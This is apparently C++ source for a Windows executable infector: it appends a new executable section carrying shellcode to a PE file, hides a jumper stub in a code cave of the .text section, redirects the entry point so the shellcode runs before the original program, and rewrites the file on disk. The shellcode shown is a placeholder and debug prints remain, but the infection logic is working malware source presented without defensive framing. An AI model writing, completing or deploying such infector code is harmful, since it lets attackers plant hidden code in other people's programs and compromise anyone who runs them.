#include "Infector.h"


#include <stdio.h>

namespace Infector
{

    _declspec(noinline) int ShellcodeJumper()
    {
        void* newMainPtr = (void*)0x0123456789ABCDEF;
        void* oldMainPtr = (void*)0xFEDCBA9876543210;
 
        int (*newMain)() = (int(*)())newMainPtr;
        int (*oldMain)() = (int(*)())oldMainPtr;

        newMain();
        return oldMain();
    }

    void ShellcodeJumper_Marked()
    {
        volatile int x = 0;
    }


    __forceinline DWORD align(DWORD size, DWORD align, DWORD addr) 
    {
        if (!(size % align))
            return addr + size;
        return addr + (size / align + 1) * align;
    }

    bool InfectExecutable(
        void* executableBuffer, 
        unsigned long executableBufferSize, 
        void* shellcodeJumperBuffer, 
        unsigned long shellcodeJumperBufferSize, 
        void* shellcodeBuffer, 
        unsigned long shellcodeBufferSize, 
        void** infectedExecutableBuffer, 
        unsigned long* infectedExecutableBufferSize)
    {

        const char sectionName[] = {'.', 'e', 'x', 'p', '3'};

        if (reinterpret_cast<PIMAGE_DOS_HEADER>(executableBuffer)->e_magic != IMAGE_DOS_SIGNATURE)
            return false;

        PIMAGE_DOS_HEADER pOriginalDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(executableBuffer);
        PIMAGE_NT_HEADERS pOriginalNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((ULONG_PTR)(executableBuffer) + pOriginalDosHeader->e_lfanew);

        PIMAGE_SECTION_HEADER pFirstSection = reinterpret_cast<PIMAGE_SECTION_HEADER>((ULONG_PTR)&pOriginalNtHeaders->OptionalHeader + pOriginalNtHeaders->FileHeader.SizeOfOptionalHeader);
        PIMAGE_SECTION_HEADER pLastSection = &(pFirstSection[pOriginalNtHeaders->FileHeader.NumberOfSections - 1]);
        PIMAGE_SECTION_HEADER pNewSection = &(pFirstSection[pOriginalNtHeaders->FileHeader.NumberOfSections]);

        custom_std::memset(pNewSection, 0x00, sizeof(IMAGE_SECTION_HEADER));

        custom_std::memcpy(pNewSection->Name, sectionName, sizeof(sectionName));

        pNewSection->Misc.VirtualSize = align(shellcodeBufferSize, pOriginalNtHeaders->OptionalHeader.SectionAlignment, 0);
        pNewSection->VirtualAddress = align(pLastSection->Misc.VirtualSize, pOriginalNtHeaders->OptionalHeader.SectionAlignment, pLastSection->VirtualAddress);
        pNewSection->SizeOfRawData = align(shellcodeBufferSize, pOriginalNtHeaders->OptionalHeader.FileAlignment, 0);
        pNewSection->PointerToRawData = align(pLastSection->SizeOfRawData, pOriginalNtHeaders->OptionalHeader.FileAlignment, pLastSection->PointerToRawData);
        pNewSection->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;

        *infectedExecutableBufferSize = pNewSection->PointerToRawData + pNewSection->SizeOfRawData;
        *infectedExecutableBuffer = custom_std::malloc(*infectedExecutableBufferSize);

        for (size_t i = 0; i < pOriginalNtHeaders->OptionalHeader.SizeOfHeaders; i++)
        {
            ((BYTE*)*infectedExecutableBuffer)[i] = ((BYTE*)executableBuffer)[i];
        }
        
        PIMAGE_DOS_HEADER pInfectedDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(*infectedExecutableBuffer);
        PIMAGE_NT_HEADERS pInfectedNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((ULONG_PTR)(*infectedExecutableBuffer) + pInfectedDosHeader->e_lfanew);

        PIMAGE_SECTION_HEADER pTempSection = IMAGE_FIRST_SECTION(pInfectedNtHeaders);

        custom_std::memcpy(&(pTempSection[pInfectedNtHeaders->FileHeader.NumberOfSections]), pNewSection, sizeof(IMAGE_SECTION_HEADER));

        pInfectedNtHeaders->FileHeader.NumberOfSections += 1;
        pInfectedNtHeaders->OptionalHeader.SizeOfImage = pNewSection->VirtualAddress + pNewSection->Misc.VirtualSize;

        custom_std::memset(reinterpret_cast<void*>((ULONG_PTR)(*infectedExecutableBuffer) + pNewSection->PointerToRawData), 0x00, pNewSection->SizeOfRawData);
        custom_std::memcpy(reinterpret_cast<void*>((ULONG_PTR)(*infectedExecutableBuffer) + pNewSection->PointerToRawData), reinterpret_cast<void*>(shellcodeBuffer), shellcodeBufferSize);

        PIMAGE_SECTION_HEADER pCurrentInfectedSection = IMAGE_FIRST_SECTION(pInfectedNtHeaders);
        PIMAGE_SECTION_HEADER pCurrentOriginalSection = IMAGE_FIRST_SECTION(pOriginalNtHeaders);
        for (size_t i = 0; i < pOriginalNtHeaders->FileHeader.NumberOfSections; i++)
        {
            custom_std::memcpy(reinterpret_cast<void*>((ULONG_PTR)(*infectedExecutableBuffer) + pCurrentInfectedSection->PointerToRawData),
                reinterpret_cast<void*>((ULONG_PTR)(executableBuffer) + pCurrentOriginalSection->PointerToRawData),
                pCurrentOriginalSection->SizeOfRawData);

            pCurrentInfectedSection++;
            pCurrentOriginalSection++;
        }

        // Search for code cave in .text section
        PIMAGE_SECTION_HEADER pInfectedTextSection = IMAGE_FIRST_SECTION(pInfectedNtHeaders);
        for (size_t i = 0; i < pInfectedNtHeaders->FileHeader.NumberOfSections; i++)
        {
            if (pInfectedTextSection->VirtualAddress <= pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint && pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint <= (pInfectedTextSection->VirtualAddress + pInfectedTextSection->Misc.VirtualSize))
            {
                break;
            }

            pInfectedTextSection++;
        }
        const unsigned char codeCaveValue = 0x00;
        unsigned long foundCodeCaveIndex = -1;
        for (size_t i = 0; i < pInfectedTextSection->SizeOfRawData - shellcodeJumperBufferSize; i++)
        {
            bool foundPattern = true;
            for (size_t j = 0; j < shellcodeJumperBufferSize; j++)
            {
                if (reinterpret_cast<BYTE*>(*infectedExecutableBuffer)[pInfectedTextSection->PointerToRawData + i + j] != codeCaveValue)
                {
                    foundPattern = false;
                    break;
                }
            }

            if (foundPattern)
            {
                foundCodeCaveIndex = pInfectedTextSection->PointerToRawData + i;
                break;
            }
        }
        
        printf("OK");

        // Dont forget to cleanup data
        if (foundCodeCaveIndex == -1)
            return false;


        // Now set the code cave inside
        BYTE* codeCaveShellcodePointer = &reinterpret_cast<BYTE*>(*infectedExecutableBuffer)[foundCodeCaveIndex];
        custom_std::memcpy(codeCaveShellcodePointer, shellcodeJumperBuffer, shellcodeJumperBufferSize);

        for (size_t i = 0; i < shellcodeJumperBufferSize - sizeof(ULONG_PTR); i++)
        {
            // new main pointer
            if (*reinterpret_cast<ULONG_PTR*>(&codeCaveShellcodePointer[i]) == 0x0123456789ABCDEF)
            {
                *reinterpret_cast<ULONG_PTR*>(&codeCaveShellcodePointer[i]) = pCurrentInfectedSection->VirtualAddress;
            }

            // old main pointer
            if (*reinterpret_cast<ULONG_PTR*>(&codeCaveShellcodePointer[i]) == 0xFEDCBA9876543210)
            {
                *reinterpret_cast<ULONG_PTR*>(&codeCaveShellcodePointer[i]) = pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint;
            }
        }
        
        // Set entrypoint
        pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint = foundCodeCaveIndex - pInfectedTextSection->PointerToRawData + pInfectedTextSection->VirtualAddress;
        
        return true;
    }

	bool GetFileData(const wchar_t* path, void** buffer, unsigned long* bufferSize)
	{
        bool succeed = false;
        LARGE_INTEGER fileSize;
        DWORD dwRead;
        HANDLE hFile = NULL;

        *buffer = NULL;
        *bufferSize = 0;

        do
        {
            hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE || hFile == NULL)
                break;

            if (!GetFileSizeEx(hFile, &fileSize))
                break;
            
            if (fileSize.HighPart != 0)
                break;

            *bufferSize = fileSize.LowPart;
            *buffer = custom_std::malloc(*bufferSize);
            if (*buffer == NULL)
                break;

            if (!ReadFile(hFile, *buffer, *bufferSize, &dwRead, NULL))
                break;

            succeed = true;

        } while (false);
	
        if (hFile != INVALID_HANDLE_VALUE && hFile != NULL)
            CloseHandle(hFile);
        
        if (!succeed)
        {
            *bufferSize = 0;
            if (*buffer != NULL)
            {
                custom_std::free(*buffer);
            }
            
        }

        return succeed;
	}

    bool SetFileData(const wchar_t* path, void* buffer, unsigned long bufferSize)
    {
        bool succeed = false;
        HANDLE hFile = NULL;
        DWORD dwWritten;
        do
        {
            hFile = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE || hFile == NULL)
                break;

            if (!WriteFile(hFile, buffer, bufferSize, &dwWritten, NULL))
                break;

            succeed = true;

        } while (false);

        if (hFile != INVALID_HANDLE_VALUE && hFile != NULL)
            CloseHandle(hFile);


        return succeed;
    }

    bool InfectFile(const wchar_t* path)
    {
        void* executableBuffer;
        unsigned long executableBufferSize;

        void* infectedExecutableBuffer;
        unsigned long infectedExecutableBufferSize;


        unsigned char section[] = {'4', '3', '2', '1', '\x00'};
        unsigned long sectionSize = 5;

        void* shellcodeJumper = ShellcodeJumper;
        unsigned long shellcodeJumperSize = (ULONG_PTR)ShellcodeJumper_Marked - (ULONG_PTR)ShellcodeJumper;

        printf("size %d\n", shellcodeJumperSize);

        // don't forget to do cleanup after
        if (!GetFileData(path, &executableBuffer, &executableBufferSize))
        {
            return false;
        }

        if (!InfectExecutable(executableBuffer, executableBufferSize, shellcodeJumper, shellcodeJumperSize, section, sectionSize, &infectedExecutableBuffer, &infectedExecutableBufferSize))
        {
            return false;
        }

        if (!SetFileData(path, infectedExecutableBuffer, infectedExecutableBufferSize))
        {
            return false;
        }

        return true;
    }

}



